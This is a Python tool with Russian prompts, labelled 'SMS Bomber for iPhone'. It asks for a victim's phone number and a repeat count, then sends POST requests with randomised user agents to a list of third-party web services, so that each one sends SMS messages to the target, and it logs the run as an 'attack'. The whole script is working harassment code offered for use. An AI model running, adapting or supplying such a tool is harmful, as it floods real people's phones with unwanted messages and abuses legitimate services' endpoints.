import sys
import requests
import random
import sys
import time
import argparse
import os
import services

from datetime import datetime

banner = """[--] Имя: SMS Bomber for iPhone
[--] Автор: fsystem
[--] Сервисов: """ + str(len(services.get_services('', ''))) + ' шт.'

print(banner)
print('')
print('Введите номер телефона для атаки (79ххххххххх):')
phone = input()

print('')
print('Введите кол-во повторений (не больше 5)')
repeat = int(input()) 

if repeat > 5:
    print('Кол-во повторений не может превышать 5!')
    sys.exit()
else:
    if phone != "":
        if phone[0] == '+':
            phone = phone[1:]

            if phone[0] == '8':
                phone = '7' + phone[1:]

            if phone[0] == '9':
                phone = '7' + phone

        print('')
        print(datetime.strftime(datetime.now(), "%H:%M:%S") + ': Атака запущена на номер: ' + phone)
        print('')

        useragents = open('useragents.txt').read().split('\n')
        User_Agent = random.choice(useragents)

        _services = services.get_services(phone, User_Agent)

        for i in range(0, repeat):
            for j in range(0, len(_services)):
                try:
                    requests.post(_services[j]['url'], data=_services[j]['data'], headers=_services[j]['headers'])
                    print(datetime.strftime(datetime.now(), "%H:%M:%S") + ':  ' + str(j) + '. [+] ' + _services[j]['name'] + ' отправлено!')
                except:
                    print(datetime.strftime(datetime.now(), "%H:%M:%S") + ':  ' + str(j) + '. [-] ' + _services[j]['name'] + ' не отправлено!')

            try:
                print('')
                print(datetime.strftime(datetime.now(), "%H:%M:%S") + ': ' + str(i) + ' круг пройден')
                print('')
            except:
                break

    else:
        print('')
        print('НОМЕР НЕ МОЖЕТ БЫТЬ ПУСТЫМ ЗНАЧЕНИЕМ!')
        print('')
